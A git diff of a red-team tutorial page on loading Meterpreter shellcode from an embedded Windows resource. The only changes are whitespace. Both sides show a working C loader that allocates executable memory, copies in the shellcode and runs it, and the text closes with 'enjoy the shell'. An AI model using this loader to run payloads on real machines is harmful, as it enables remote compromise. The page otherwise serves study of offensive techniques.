@@ -54,17 +54,17 @@ We can then leverage a small set of self-explanatory Windows APIs to find the em
 
 int main()
 {
-	// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
-	// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
-	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_METERPRETER_BIN1), L"METERPRETER_BIN");
-	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
-	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
-	
-	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	memcpy(exec, shellcodeResouceData, shellcodeSize);
-	((void(*)())exec)();
+    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
+    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
+    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_METERPRETER_BIN1), L"METERPRETER_BIN");
+    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
+    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
 
-	return  0;
+    void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcodeResouceData, shellcodeSize);
+    ((void(*)())exec)();
+
+    return  0;
 }
 ```
 
@@ -72,5 +72,5 @@ Compile and run the binary and enjoy the shell:
 
 ![](../../.gitbook/assets/peek-2019-04-21-12-30.gif)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/menurc/finding-and-loading-resources" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/menurc/finding-and-loading-resources" caption="" %}
 
